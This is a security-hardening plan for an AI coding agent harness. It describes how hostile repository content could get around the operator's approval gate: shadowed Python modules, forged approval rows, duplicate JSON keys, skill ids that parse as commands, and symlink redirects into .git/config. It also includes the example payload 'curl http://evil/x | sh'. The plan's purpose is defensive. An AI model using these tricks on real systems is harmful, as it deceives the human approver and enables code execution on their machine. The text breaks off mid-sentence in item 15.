# Hostile-bytes hardening — implementation plan

- **Goal:** close the confirmed findings from the external security audit under the one threat
  model that fits an agentic harness — the operator is trusted, the bytes they operate on are
  not, and neither is the model. Every item either stops unbounded work running without a gate,
  or stops the approval surface showing something other than what the executor will do.
- **Date:** 2026-08-11 · **Status:** not started
- **Sized for:** ~200k-context host; one commit per item, items independently committable
- **Skills:** `coding-standards`
- **Authoritative sources** (an item that disagrees with these follows these):
  - ADR 0012 — the autonomy ladder × blast radius, and the invariant every item serves:
    *"a tool call runs without a human gate only if its blast radius is bounded."*
  - ADR 0019 — the presentation ladder (why `present_document` runs in Plan).
  - `docs/design/confinement-execution-contract.md` §4 — the ladder table and Gate `Reason` map.
  - `internal/security/doc.go` — the guard-is-not-a-boundary statement.
  - `TODO.md` L1–L4 — the accepted trade-offs; no item here reopens one.
  - The triage written by item 1, once it exists, for the finding-by-finding evidence.
- **Verified against:** HEAD `d6d1479`. Every `file:line` below was re-read at that commit by a
  verification pass; where the audit's own claim was wrong, the item says so.
- **Re-verified against:** HEAD `b0252d4` (2026-08-11), by a second pass that read the audit
  artifact itself rather than this plan's summary of it. Line numbers have drifted a few lines
  since `d6d1479` (`orderedArgs` is now `toolpresent.go:2249`, `stripEscapes`
  `transcript.go:1347`, `popupBodyLines` `popup.go:1001`); every mechanism is unchanged. That
  pass found four ranked positions this plan had dropped — they are **Cluster D**, items 16–19 —
  and three fixes whose stated shape did not fully close the mechanism they targeted; those are
  the amendments now folded into items 2, 3 and 4.

## Ratified design calls

Owner, 2026-08-11, via AskUserQuestion:

1. **`python_exec` path policy — `PYTHONSAFEPATH=1` only.** No prelude, no `sys.path` injection.
   A snippet that wants project imports adds the path itself, which makes the addition visible in
   the `code` the operator approves. Binding on item 3.
2. **Symlinked reads — follow, but show the resolution.** Reads keep working; the resolved target
   is surfaced on the approval pane, the transcript card and the result string, reusing item 8's
   `→ resolves to <X>` line. Binding on items 8 and 13.
3. **Active-content presentation — drop from the OS opener, keep served.** `.html/.htm/.xhtml/.svg`
   leave rung 1 (`file://`, where no CSP is possible) and stay on rung 2, the doc server, which
   gains CSP + `nosniff`. Binding on item 4.

### Pending ratification — raised by the re-verification pass

Do **not** start items 2 or 3 until the owner answers these. Both are trade-offs the first pass
made silently; each has a recommended default, and the recommendation is what the item text
below assumes.

4. **Pre-3.11 Python — use `-I` where `PYTHONSAFEPATH` is inert.** *Recommended.* Ratified call 1
   forbids `-I` because blanket isolation stops the model importing project modules. But item 3
   also rewrites the tool description to say a project import needs an explicit `sys.path` line —
   and once that is the contract, `-I` delivers *the same operator-visible behaviour* as
   `PYTHONSAFEPATH=1`, because `sys.path.append` works fine under `-I`. `PYTHONSAFEPATH` landed
   in 3.11; `pythonCandidates` probes `python3` first, which on a stock macOS is often 3.9, so
   without this the audit's **#1 — its highest-ranked, "critical, always-on" finding — is not
   closed on a large fraction of real hosts**. The narrow amendment: prefer `PYTHONSAFEPATH=1`;
   fall back to `-I` only when the detected interpreter is older than 3.11. The alternative is to
   accept a silent residual on those hosts, which is what item 3 originally proposed.
5. **Item 2's refusal ships without an escape hatch.** *Recommended, with the cost stated.*
   Refusing an `argv[0]` that resolves inside the workspace collides head-on with the single most
   common Python and Node layout: an activated `<repo>/.venv/bin/python3`, or
   `node_modules/.bin` on `PATH`. `lookInterpreter` (`python_exec.go:41`) and `lookTestProgram`
   (`run_tests.go:367`) resolve against apogee's own inherited `PATH`, so both resolve inside the
   root and both start refusing. The audit names exactly these layouts as the precondition for
   its #5, so the collision is structural, not incidental. Recommendation: refuse anyway, make
   the refusal legible (name the resolved path and the rule), and record the ergonomics cost as a
   new `TODO.md` L-entry rather than adding a config key in this batch — a key would be a new
   operator-armed footgun, which **Out of scope** excludes. Two alternatives were considered and
   rejected: keying the refusal on "resolved via `PATH` lookup rather than an absolute config
   value" (does not help — a venv interpreter *is* found via `PATH`), and "was this file written
   during the session" (stateful and racy). If the cost proves unacceptable in practice, a config
   key is a small later addition.

## Out of scope

Recorded as deliberate exclusions; do not let an item drift into these.

- **Operator-armed footguns:** `present.command`, `--workspace /` or `$HOME`, `APOGEE_MODE=auto`,
  the markdown-fenced model profile, the llama-launcher surface, a bare-name `mcp-servers`
  command. Each needs a config value or flag nobody picks by accident.
- **Attacks on apogee's own build and release:** the `go.work` backdoor, the `VERSION`-into-`make
  dist` splice, unsigned laptop-built releases, the unpinned default system prompt. All presuppose
  the audited workspace *is* the apogee repo.
- **`TODO.md` L2/L3/L4 acceptances:** the dangerous-action guard being trivially evadable (L2),
  read-and-exfiltrate from inside the box (L3), stdio MCP environment inheritance (L4). No item
  here argues against these; items that touch adjacent code leave the acceptance intact.
- **Hostile inference endpoint / transport:** unclamped `/props` and `/v1/models` values, the
  model id reaching `os.Open`, the gauge-overflow OOM, the bearer resent across a scheme
  downgrade. A different threat model (a proxy you do not control), not the default posture.
- **The gate-reason wording** (`resolution.go:506` announcing "confinement unavailable on this
  host" on every gated subprocess). Already owned by
  `docs/plans/2026-08-11 - 03 - subprocess-gate-reason-plan.md`; execute that plan separately.
  No item here touches `gateReason`.
- **Human-timing attacks on the gate** (`⇧⇥` re-authorising an in-flight batch, the menu opening
  on Allow with no key flush, the `/schedule` picker staying interactive). Real and always-on, but
  TUI ergonomics rather than hostile bytes — a second wave if these land.

## Context

An external security audit produced 172 findings, triaged by its own tooling to 14 ranked
positions (source: a Claude artifact at `~/Desktop/Apogee security audit.html`, not in-repo). Its
framing is the part worth keeping:

> **The operator is trusted. The bytes they operate on are not, and neither is the model.** An
> attacker authors a cloned repo, a fetched page, or an MCP result; apogee reads it; the model
> acts on it. Stock install — `ask-before`, `confine-to-workspace: true`, `present.auto-open:
> true`, `use-project-skills: true`.

That is not the model a generic scanner assumes (supply chain, build integrity, dependency CVEs),
which is why most of the raw output was noise. The ranked subset is not: three verification passes
re-read the tier-one and tier-two findings against HEAD `d6d1479`, quoting current code rather
than trusting the finding text.

**Confirmed, fire on a stock install:** python_exec stdlib shadowing; approval-pane head/tail
mismatch and duplicate keys; skill-id-is-a-command-line; newline-forged approval rows;
allow-for-session keyed on the bare tool name; bidi overrides surviving the TUI strippers;
repo-supplied git hooks; a backgrounded grandchild outliving a clean exit.

**Confirmed, but bounded to a local desktop session:** `.html`/`.svg` in the "renders, never
executes" allow-list, and `present_document`'s unconfined bare-name exec. The audit is explicit
about this bound and the first pass dropped it: `presentationRungs` wires the opener only on
`rungs.Local && p.autoOpen`, and `Opener.argv` additionally requires `HasDesktop`, so **any**
`SSH_*` variable in the environment flips `Locality` to Remote and the opener is never built. A
headless container has neither half. That is still apogee's primary persona, so items 4 and 5
keep their place — but the triage item 1 writes must carry the bound, or it overstates the
finding to a maintainer who will check.

**Overclaimed, corrected:** the audit's #6 — a write *through* a final-name symlink — is
**defended**. `SafeWriteFile` replaces the name via rename, pinned by
`TestSafeWriteFile_ReplacesInRootSymlinkName` (`internal/security/safeio_test.go:280`). Two real
siblings survive and are item 13.

**Audit errors worth recording:** the pane truncation is *not* silent (it prints `… (+N more
lines)`, pinned by `TestModelApprovalNamesTheProseItCannotShow`); the duplicate-key trick does
*not* bypass the guards — `security/dangerous.go:190` and `tools/workspace_scoped.go:66` are
last-wins too, so only the **pane** disagrees with the executor; and the Cf claim is
half-wrong — the audit says "all three strippers test `unicode.IsControl`, which is Cc only", but
`web_fetch.go:161` and `library/store.go:386` already drop `unicode.Cf` explicitly. The gap is
three *other* seams, named in item 17.

**Ranked positions this plan first dropped, now items 16–19.** The re-verification pass mapped
all fourteen ranked positions onto items and found four with no owner and no exclusion — read as
oversights rather than decisions, since **Out of scope** does not name them either. All four were
confirmed live at `b0252d4`: the allow-for-session cache keyed on the bare tool name
(`gateCacheKey`, `resolution.go:451-458`, returns `call.Tool`); no TUI seam stripping Unicode Cf;
a backgrounded grandchild surviving a clean exit (`cmd.Cancel` is the only group kill, and it
runs on ctx cancellation alone); and `diagnostics` handing the Go toolchain git's environment
allowlist (`diagnostics.go:207`, `env: safeGitEnv()`).

None of these are dangerous-action-guard complaints, so none die on the L2/L3/L4 acceptances —
which the audit itself identifies as the single biggest predictor of a finding being answered
"intended".

---

## 1. Record the audit triage

**What:** Write `docs/reviews/2026-08-11 - 01 - external-audit-triage.md` containing: the threat
model quoted above; a table of the 14 ranked positions with a CONFIRMED / PARTIALLY-CONFIRMED /
REFUTED verdict and the verified `file:line` evidence for each; the two audit errors named in the
Context section; and the exclusion buckets from **Out of scope**. Add one `ISSUES.md` line per
confirmed finding, each naming the item number below that owns it. Append a note to the `TODO.md`
L-block recording that the audit was triaged against L2/L3/L4 and which findings those
acceptances did *not* dismiss.

**Tests:** none (documentation only).
**Acceptance:**
- `ls "docs/reviews/2026-08-11 - 01 - external-audit-triage.md"` succeeds.
- `grep -c "item " ISSUES.md` returns ≥ 15 (one line per confirmed finding, Cluster D included).
- `grep -n "L2\|L3\|L4" TODO.md` shows the new triage note adjacent to the existing L-block.
**commit:** `docs(reviews): triage the external security audit against the hostile-bytes model`

---

# Cluster A — Unconfined execution

## 2. Refuse an `argv[0]` the model can write, at every exec site

**What:** No exec site anywhere is checked against the writable confinement box —
`box.WritablePaths` appears only in the OS backends that build the write fence
(`internal/platform/seatbelt.go:154`, `landlock_linux.go:265`, `winguard.go:108`,
`confiner_windows.go:281`). So a confined Auto call can plant an executable inside the box and a
later unconfined call executes it *outside* the box. Overwriting an existing 0755 file preserves
its exec bit, so no `chmod` is needed for that chain.

Add one helper in `internal/tools` — `refuseExecFromWritablePath(argv0 string, root string, box *domain.ConfinementBox) error` — returning a typed error when `argv0` resolves inside the
workspace root or any `box.WritablePaths` entry. Call it at each of the six exec sites, which are
enumerated here so this item's scope is closed:

- `internal/tools/git.go:78` (`exec.LookPath("git")`)
- `internal/tools/python_exec.go:41` (`lookInterpreter`)
- `internal/tools/run_tests.go:367`
- `internal/tools/diagnostics.go:264`
- `internal/mechanisms/autofix.go:101`
- `internal/present/opener.go:144` (covered by item 5, which calls the same helper)

The enumeration is closed, and the re-verification pass confirmed it: a tree-wide grep for
`exec.Command` / `exec.CommandContext` / `exec.LookPath` outside tests finds only these six plus
`exec_common.go:108` (the shared exec, whose `argv[0]` comes from the six resolution sites above,
so checking at resolution covers it), `autofix.go:274` (the same chain as `:101`),
`mcp/transport.go:118`, `tui/settings.go:734`/`:751` and `cmd/apogee/settingsedit.go:134`/`:388`.
The last three are the MCP-command and editor surfaces that **Out of scope** excludes as
operator-armed. `terminal` needs no site of its own: its `argv[0]` is the platform shell, always
absolute.

Also fix the PATH half of the git finding: `safeGitEnv` (`internal/tools/git.go:70`) copies `PATH`
verbatim through `ScopeEnv` (`internal/platform/host.go:110-140`) — the "scrub" never inspects it,
so workspace-resident PATH entries survive into git's children. Filter workspace-resident
directories out of the `PATH` value that `ScopeEnv` passes through.

**The ergonomics collision, per pending ratification 5.** This item makes `python_exec` and
`run_tests` **refuse** on the single most common Python and Node layouts — an activated
`<repo>/.venv/bin/python3`, or `node_modules/.bin` ahead of the system entries on `PATH` —
because `lookInterpreter` and `lookTestProgram` resolve against apogee's own inherited `PATH` and
both land inside the root. That is the correct security answer (a model-writable `argv[0]` is
exactly the attack) but it is a real regression for real developers, and the first pass did not
name it. Two obligations follow: the refusal message must name the **resolved** path and the rule
that refused it, so the operator can see instantly that their venv is the cause rather than
reading a bare "not available"; and the closeout must add a `TODO.md` L-entry recording the
accepted cost. Do not add a config key — **Out of scope** excludes new operator-armed switches,
and a key here would be one.

**Tests:** a table test over the six sites asserting the helper is called and refuses; a
`host_test.go` case extending `TestScopeEnvKeepsTheCallersAllowlistAndAddsThePlatformFloor` to
pin that a workspace-resident PATH entry is dropped; a `python_exec` case with a workspace-resident
interpreter on `PATH` asserting the refusal **names the resolved path** rather than reporting
"no interpreter found" (the graceful-degradation message at `python_exec.go:91` is the wrong
answer here and must not be reused).
**Acceptance:**
- `go test -race ./internal/tools/... ./internal/platform/... ./internal/mechanisms/...` passes.
- `grep -rn "refuseExecFromWritablePath" internal/ --include="*.go" | grep -v _test` lists all
  six call sites.
- A fixture workspace with `.venv/bin/python3` refuses with a message containing that path.
**commit:** `fix(tools): refuse an argv0 resolved inside the writable box`

## 3. `python_exec` — the workspace must not precede the stdlib on `sys.path`

**Depends on item 2** (shares `internal/tools/exec_common.go`'s env handling).

**What:** `internal/tools/python_exec.go:101` builds `argv: []string{interp, "-"}` with `dir` =
workspace root and no isolation flag. For a program read from stdin CPython puts the cwd at the
front of `sys.path`, so a repo-root `json.py` / `socket.py` / `subprocess.py` / `requests.py` owns
any import the snippet makes — and the payload never appears in the `code` argument the operator
approves. Confinement is not a mitigation: `internal/platform/seatbelt.go:130` states the box
leaves read/exec open, so the Auto path executes the repo's `json.py` too.

Per ratified call 1: set `PYTHONSAFEPATH=1` in the subprocess environment. Do **not** use
`PYTHONPATH`: its entries precede the stdlib, so it can shadow too. Update the `python_exec` tool
description so the model knows a project import needs an explicit `sys.path` line.

**Pre-3.11 interpreters, per pending ratification 4.** `PYTHONSAFEPATH` landed in 3.11 and older
interpreters ignore it silently, so on those hosts the fix above is a **no-op** and the audit's
#1 stays open. `pythonCandidates` probes `python3` first, which on a stock macOS is frequently
3.9, so this is the common case rather than the exotic one. Detect the interpreter version at
resolution and, when it is older than 3.11, pass `-I` instead. This is the one narrow exception
to ratified call 1's "no `-I`": once the tool description says a project import needs an explicit
`sys.path` line, `-I` and `PYTHONSAFEPATH=1` present the *same* contract to the operator, because
`sys.path.append` works normally under `-I`. Keep the rest of ratified call 1 intact — no prelude,
no `sys.path` injection, and on 3.11+ no isolation flag at all. Do not add `-s`, `-S`, `-E` or
`-P` on any version: `-P` shares `PYTHONSAFEPATH`'s 3.11 floor and buys nothing over it, and the
other three do not address the load path. If the owner instead ratifies the silent residual,
state it in the tool's doc comment and change nothing else here.

This requires setting `spec.env` explicitly rather than leaving it nil
(`internal/tools/exec_common.go:110-112`). While there, drop apogee's own secrets — the
`APOGEE_API_KEY` variable (`internal/config/config.go:1531`) and any configured server key — from
what `python_exec` and `terminal` inherit. This removes *apogee's own* credentials only; it is not
the blanket allowlist `TODO.md` L4 deferred, so it does not reopen that call.

**Tests:** `python_exec_test.go` pins neither argv nor env today — add both; a fixture workspace
shipping a root `json.py` that writes a marker file, asserting `import json` resolves to the
stdlib and the marker is absent; a case asserting `APOGEE_API_KEY` is absent from the child env;
and a case asserting the argv carries `-I` for a stubbed pre-3.11 interpreter and does **not**
for a 3.11+ one. The shadowing fixture runs a real interpreter, so its result depends on the
host's `python3` — it must `t.Skip` explicitly with the detected version when no interpreter is
present, never pass by accident on a host where the mechanism was untested.
**Acceptance:**
- `go test -race ./internal/tools/...` passes, including the new shadowing fixture.
- `grep -n "PYTHONSAFEPATH" internal/tools/python_exec.go` shows the variable set.
- The version-fallback branch is covered by a stubbed `lookInterpreter`, so the assertion does
  not depend on which Python the CI host happens to ship.
**commit:** `fix(tools): stop the workspace shadowing the Python stdlib in python_exec`

## 4. Drop active-content formats from the OS opener; harden the served rung

**What:** `internal/present/opener.go:172` states an extension earns its place "only when its
default handler DISPLAYS the file" — and the map at `:209-212` contains `.html`, `.htm`, `.xhtml`,
`.svg`, whose handler both displays *and* executes. `present_document` is `ReadOnly`
(`internal/tools/present_document.go:63`) so it auto-runs in **every** mode including Plan,
`AutoOpen` defaults true (`internal/config/config.go:661`), and the document need not be
model-written — one that arrived in the clone is enough. Script in that page reaches loopback,
RFC1918 and `169.254.169.254` from the browser's network position, with none of the `URLGuard`
filtering that is the stated justification for `classNetwork` auto-running.

Per ratified call 3: remove the four extensions from `openerRenderableExts`, and restate the
allow-list's doc comment to say why active containers are excluded by the same rule that already
excludes macro-bearing formats. Keep them on rung 2 (`internal/tui/presenter.go:173`) and add
`Content-Security-Policy` and `X-Content-Type-Options: nosniff` at `internal/present/server.go:342`,
which today sets only `Content-Type`.

Removing the four extensions is sufficient on its own for the desktop persona, and the
re-verification pass confirmed why: `climb` (`presenter.go:136-153`) makes the two branches
exclusive — a Local session attempts rung 1 and then degrades to the **baseline transcript rung**,
never falling through to rung 2. So a Local `present_document report.html` stops launching a
browser at all. Rung 2 is the Remote path, and the CSP is what bounds it there.

**Name the policy; the header's presence is not the fix.** The audit's mechanism is a `fetch()`
or `<meta http-equiv=refresh>` reaching loopback, RFC1918 and `169.254.169.254` from the browser's
network position. Only a restrictive policy closes that, and a permissive one would satisfy a
test that merely asserts the header exists. The recommended value:

```
Content-Security-Policy: default-src 'none'; img-src 'self' data:; style-src 'unsafe-inline'; form-action 'none'; base-uri 'none'; frame-ancestors 'none'; sandbox
```

`default-src 'none'` is the directive that matters — it blocks script, `fetch`, XHR and
subresource loads. `img-src`/`style-src` are what still let a self-contained report render.
`sandbox` is not redundant: CSP has no directive for `<meta http-equiv=refresh>`, and a bare
`sandbox` withholds `allow-top-navigation`, which is what stops the meta-refresh half. Note that
`nosniff` addresses none of this — it is adjacent hardening, worth adding, but the CSP is the
load-bearing half and the acceptance below tests for it by name.

**Tests:** `opener_test.go:259` currently pins these four as *allowed* — invert those cases and
restate the test's doc comment to say why the new behaviour is correct.
`TestBrowserRenderableIsASubsetOfTheOpenerSet` (`presenter_test.go:401`) breaks by construction:
`browserRenderableExts` is `.html/.htm/.svg/.pdf` and three of those four leave the opener set, so
only `.pdf` still overlaps — restate the subset relation as a deliberate inversion on this axis,
not a repair. Add a server test asserting the CSP **directives**, not merely the header's
presence, plus `nosniff`.
**Acceptance:**
- `go test -race ./internal/present/... ./internal/tui/...` passes.
- `grep -n "\"\.html\"\|\"\.svg\"" internal/present/opener.go` returns nothing in the allow-list.
- The server test fails when `default-src 'none'` is weakened to `default-src 'self'` — state
  this check in NOTES, because a header-presence assertion would not catch it.
**commit:** `fix(present): the opener allow-list admits no active-content formats`

## 5. Resolve the opener's program absolutely

**Depends on item 2** (uses `refuseExecFromWritablePath`).

**What:** `internal/present/opener.go:144-153` execs the **bare** names `open` / `xdg-open` /
`cmd`, resolved by `exec.Command` via `LookPath` against apogee's inherited PATH — the only
bare-name exec in non-test code; every other site resolves absolutely (the five listed in item 2).
Combined with `present_document` being `classReadOnly`, this is a process spawned with no approval
and a nil box in every mode.

Resolve the three program names absolutely once, and refuse to launch when resolution lands inside
the workspace or a writable box path (item 2's helper). Deliberately do **not** reclassify
`present_document` away from `classReadOnly`: ADR 0019 makes "runs in Plan" the point of the tool,
and `planmenu_test.go:141` / `present_document_test.go:185` pin it. The blast radius belongs to the
opener rung, which items 4 and 5 bound directly.

**Tests:** an opener test that a workspace-resident `xdg-open` earlier on PATH is refused rather
than launched; a test that absolute resolution failure degrades to the baseline rung
(`ErrNoOpener`) rather than erroring the tool.
**Acceptance:**
- `go test -race ./internal/present/...` passes.
- `grep -n "exec.Command(name" internal/present/opener.go` shows the name is an absolute path.
**commit:** `fix(present): resolve opener programs absolutely and refuse writable-path argv0`

---

# Cluster B — Approval-pane integrity

## 6. Flatten model-authored fields so they cannot paint rows

**What:** `internal/tui/approval.go:167-177` joins parts with `\n` and the popup paints one row per
segment (`popup.go:1086`), while `stripEscapes` (`internal/tui/transcript.go:1317-1325`)
deliberately **keeps** `\n` and `\t`. So a newline in an argument key (`toolpresent.go:2228`) or in
a `sub_agent` task (`approval.go:240-249`, which *leads* the body) paints forged rows — including a
fake `Reason:` line above the real one, visually identical because `approvalPrompt` sets no
`bodyLead`, so every body row renders through the same `th.popupBody`.

The codebase already applies this rule elsewhere: `lineEditor.flattenLine` (`lineeditor.go:148`)
and `firstLineArg` / `clipDetail` (`toolpresent.go:1458`). Apply the same pass to the approval
body: flatten every model-authored **field** — argument key, sub-agent task, reason — to a single
line before composition. Multi-line argument *values* stay multi-line: that is real layout the
operator needs, and it now sits under a key that can no longer forge structure.

**Tests:** no test covers a newline in an argument key or a sub-agent task — add both, asserting
row counts rather than substring presence. `model_test.go:1008-1048` currently pins embedded-newline
layout as a *feature*; restate those cases to distinguish value layout (kept) from field forgery
(flattened), with a doc comment saying why.
**Acceptance:**
- `go test -race ./internal/tui/...` passes.
- The new tests fail when the flattening call is reverted (state the check in NOTES).
**commit:** `fix(tui): flatten model-authored fields so they cannot paint approval rows`

## 7. Cap values, keep the tail, and agree with the executor on duplicates

**Depends on item 6** (same render path).

**What:** Two defects on the same surface.

*Truncation.* `internal/tui/popup.go:1002` keeps the first `maxBodyRows−1` rows and drops the rest;
on 80×24 the body budget computes to 6 rows (5 content + marker), so a command whose last line is
`curl http://evil/x | sh` is authorised on the strength of `npm test` and comments above it.
`argumentValueLines` (`toolpresent.go:2290`) caps nothing, so one long value evicts every sibling
after it. Cap each argument *value* to K lines with its own inline elision so no single value can
push a sibling off the pane, and when a value is still elided keep the **tail** as well as the head
(head + `… (+N)` + last line) — the tail is where an appended payload lives.

*Duplicates.* `orderedArgs` (`toolpresent.go:2262`) streams every duplicate key in wire order while
`decodeArgs` (`internal/tools/tools.go:67`) is stdlib JSON, where the last duplicate wins — so the
pane shows a command the executor will not run. Collapse the pane to last-wins, agreeing with the
executor *and* with the guards (`security/dangerous.go:190`, `tools/workspace_scoped.go:66`, both
already last-wins), and mark the overridden key visibly.

**Tests:** no duplicate-key test exists — add one asserting the pane text equals the decoded value;
a truncation test asserting the last line of an over-long value survives; extend
`TestRenderPopupBodyMaxRows` (`popup_test.go:458`) and restate its doc comment.
**Acceptance:**
- `go test -race ./internal/tui/...` passes.
- A manual 80×24 check is recorded in NOTES: a two-key call whose second value is 20 lines shows
  both keys and the final line of the long value.
**commit:** `fix(tui): per-value caps, tail-preserving elision, last-wins duplicate keys`

## 8. Show the resolved path when it differs from the argument

**What:** apogee already computes the true write target (`internal/agent/dispatch.go:717-723`) but
consumes it only as a bool for the gate decision (`resolution.go:320`, `:355`); `EvalRealPath`,
`WorkspaceWriteTarget` and `WorkspaceRelative` appear **nowhere** under `internal/tui`. The pane
renders raw arguments (`approval.go:272-279`), the tool card renders `stringArg("path")`
(`toolpresent.go:494`), and the success string echoes `args.Path` (`write_file.go:86`). So the
operator reads `path: docs/notes.md` for an operation that lands elsewhere.

Thread the resolved path onto `domain.ApprovalRequest` and render `→ resolves to <X>` **only when
it differs** from the literal argument, on all three surfaces. Per ratified call 2 this line is
also the disclosure mechanism for symlinked reads in item 13, so build it to carry a read target as
well as a write target.

**Tests:** approval, transcript and result-string tests for a path that resolves elsewhere; a test
asserting no extra line is rendered when literal and resolved agree.
**Acceptance:**
- `go test -race ./internal/tui/... ./internal/agent/... ./internal/tools/...` passes.
- `grep -rn "resolves to" internal/tui | grep -v _test` shows the single shared renderer.
**commit:** `fix(tui): name the resolved path when it differs from the argument`

---

# Cluster C — Untrusted-repo surfaces

## 9. A skill id may not be a command line

**What:** The shadow guard and the parser disagree about what a token is. `slashSuggestions`
(`internal/tui/autocomplete.go:357`) drops a skill only when `commandByName` matches the **whole**
id; `matchCommand` (`internal/tui/command.go:297`) cuts at the first space or tab and looks up only
the first piece. `validate` (`internal/skills/parse.go:247`) checks four fields are non-empty and
nothing else, and interior whitespace survives `TrimSpace` (`parse.go:88`). So an id
`confine off --save` is invisible to the guard and a valid command line to the parser.
`<workspace>/.apogee/skills` is an unconditional source (`internal/skills/load.go:70-82`),
`use-project-skills` defaults true, and the catalog re-scans mid-session whenever the caret enters
a `/` token (`autocomplete.go:180`) — so one `write_file` goes live in the same turn with no
restart. The sinks are real: `runConfine` → `SetConfineToWorkspace(false)` plus a persisted
`unconfined-hosts:` entry (`internal/tui/confine.go:44-51`), and `/schedule 1m auto <prose>`
(`internal/tui/schedule.go:127`).

Three changes, defence in depth: reject whitespace and control characters in ids at `validate`;
make the shadow guard key on the **first token**, the same rule `matchCommand` uses, so the two
layers cannot disagree again; and correct the doc comment at `autocomplete.go:223`, which asserts
the false invariant "command verbs and skill ids are whitespace-free by construction".

**Tests:** no test uses an id containing whitespace and none asserts guard/parser agreement — add
both, plus a case iterating `commandSpecs` asserting no skill id can out-parse a builtin verb.
**Acceptance:**
- `go test -race ./internal/skills/... ./internal/tui/...` passes.
- A skill with id `confine off --save` fails to load, asserted by test.
**commit:** `fix(skills,tui): reject whitespace in skill ids and align the shadow guard`

## 10. Disclose a skill's source

**Depends on item 9.**

**What:** No surface anywhere shows whether a loaded skill came from the cloned repo, the user
library, or the builtins. `Skill.Dir` is carried (`load.go:148`) and deliberately available but
never rendered; paths appear only for skills that *failed* to load (`internal/tui/skills.go:187`).
Render the source on the `/` menu row (`autocomplete.go:363`) and in `/skills`
(`skills.go:128`). This is the cheapest mitigation in the cluster and the one that makes item 9's
residual deception survivable: a hostile `DisplayName` scores an exact match in `slashMatchRank`
(`autocomplete.go:83`) and sorts **above** the genuine verb it impersonates, so a habituated
`/conf`+Tab+Enter takes the repo's row.

Also bound the rendered id: `stripEscapes` keeps `\t` and `truncateToWidth` clips at the pane edge,
so a padded id renders as `✦ /confine        …` with the payload clipped off-screen — which defeats
the "an attentive human would see it" defence entirely. Flatten and clip ids so the visible row
either shows the whole id or is visibly marked as elided.

**Tests:** menu and `/skills` rows carry the source; a whitespace-padded id renders visibly elided
rather than silently clipped.
**Acceptance:**
- `go test -race ./internal/tui/...` passes.
- A manual check recorded in NOTES: a workspace skill and a user-library skill are distinguishable
  on the `/` menu at 80 columns.
**commit:** `feat(tui): disclose a skill's source on the menu and /skills`

## 11. Contain the skill-loader anchor and bound its walk

**What:** `loadDir` (`internal/skills/load.go:89`) calls `os.OpenRoot(dir)` on a path **inside the
untrusted repo**, with no `Lstat` and no containment check. Go's `openRootNolog` does not pass
`O_NOFOLLOW` on the anchor itself (unlike `openRootInRoot`), so a repo shipping `.apogee/skills` —
or `.apogee`, or `skills` — as a symlink relocates the fence. Correction to the audit: a symlink
*below* the anchor **is** refused, pinned by `TestLoadSymlinkEscapeRefused` (`load_test.go:290`);
the gap is **any component of the anchor path**, which is exactly what that test does not cover.
The doc comment at `load.go:88` claims the protection that is missing — restate it.

Resolve and containment-check every component of the anchor before pinning, and bound the walk by
directory count and depth: `maxSkills` (`load.go:110`) stops after 1024 *loaded skills*, not
directories, so `.apogee/skills → /` walks the whole filesystem.

**Tests:** symlink the source dir itself (untested today) at each of the three anchor components;
a walk-bound test asserting a deep or wide tree terminates.
**Acceptance:**
- `go test -race ./internal/skills/...` passes.
- A fixture with `.apogee/skills` symlinked to `/tmp` loads zero skills.
**commit:** `fix(skills): contain the loader anchor and bound the walk`

## 12. Move the skill reload off the render goroutine

**Depends on item 11.**

**What:** `ReloadSkills` runs a synchronous full disk re-walk on the Bubble Tea update goroutine
every time the caret enters a `/` token (`internal/tui/autocomplete.go:185`, wired at
`cmd/apogee/wire_options.go:210`), so a keystroke blocks the render loop for the length of a
filesystem walk. Item 11 bounds the walk; this item removes the coupling, moving the reload to a
command that delivers its result as a message, per ADR 0011's worker-goroutine model.

**Tests:** assert the reload is dispatched as a `tea.Cmd` rather than executed inline; assert the
menu still shows a freshly written skill in the same turn (the behaviour `TestSlashMenuReloadsTheCatalogOnOpen`,
`skill_test.go:596`, pins today).
**Acceptance:**
- `go test -race ./internal/tui/...` passes, including the existing reload-on-open test.
**commit:** `fix(tui): reload the skill catalog off the update goroutine`

## 13. Symlink policy on the write and read paths

**Depends on item 8** (uses the `→ resolves to <X>` renderer).

**What:** This is the audit's #6, restated correctly. `SafeWriteFile` protects only the **final**
component — parents are followed inside the root, deliberately (`internal/security/safeio.go:89-99`
says so). So an in-root directory symlink `docs → .git` makes `write_file{"path":"docs/config"}`
land on `.git/config` while the pane says `docs/config`, entirely inside the workspace, so
`confine-to-workspace` never fires. There is no `.git` write protection anywhere.

The read side is the sharper half: `SafeReadFile` (`safeio.go:210`) *does* follow a final-name
in-root symlink, so `edit_existing_file` / `single_find_and_replace` (`file_edit.go:76`,
`find_replace.go:97`) read `.git/config` through `docs/notes.md`, patch it, and write the result to
`docs/notes.md` — content disclosure plus a destroyed symlink, reported as "applied patch to
docs/notes.md".

Per ratified call 2: **refuse** writes whose parent chain crosses a symlink; **follow** reads but
surface the resolved target through item 8's renderer. Restate the `safeio.go` contract comment and
`internal/security/doc.go`'s path-safety paragraph, both of which now over-promise.

**Tests:** a directory-symlink write redirect (untested today — only the final-name case is pinned
by `TestSafeWriteFile_ReplacesInRootSymlinkName`); a symlinked-read case asserting the resolved
target reaches the result string.
**Acceptance:**
- `go test -race ./internal/security/... ./internal/tools/...` passes.
- A fixture with `docs → .git` refuses `write_file docs/config`.
**commit:** `fix(security): refuse symlink-crossing write parents, disclose symlinked reads`

## 14. Protect `.git/` and `~/.apogee` on the dangerous-action floor

**What:** The floor names `.ssh`, `.aws`, `.netrc` and `.npmrc` but neither `.git/` nor apogee's
own `~/.apogee` control plane — an asymmetry rather than a recall complaint, and the audit rates it
a one-regex fix. Add both to `DefaultDangerousRules` (`internal/security/rules.go`), each with the
comment-per-rule saying where its boundary is, per that file's convention. This tightens the floor
only; `MergeDangerousRules` semantics are untouched, so `TODO.md` L1 and L2 stay as they are.

**Tests:** extend `rules_test.go` with coverage for both paths at the appropriate tier.
**Acceptance:**
- `go test -race ./internal/security/...` passes.
**commit:** `fix(security): add .git and the apogee control plane to the dangerous floor`

## 15. Stop repo-supplied git hooks and filters from running

**What:** `runGit` hardens the environment but nothing on disk. A repo-wide grep confirms no `-c`,
no `GIT_CONFIG_NOSYSTEM`, no `--no-verify`, no `--no-textconv` and no `core.hooksPath` anywhere in
the tree — so `git_commit` on an attacker-authored clone executes that repo's `.git/hooks/pre-commit`,
and `.gitattributes` filter drivers and textconv fire on read paths. Delivery needs a repo shipped
*with* its `.git` (tarball, mirror, NFS checkout) or one in-workspace write; a plain `git clone`
does not carry hooks, so the write variant is the realistic one. Note `HOME` is allowlisted
(`git.go:54`), so a persistent user-level git config still applies — out of scope here, but say so
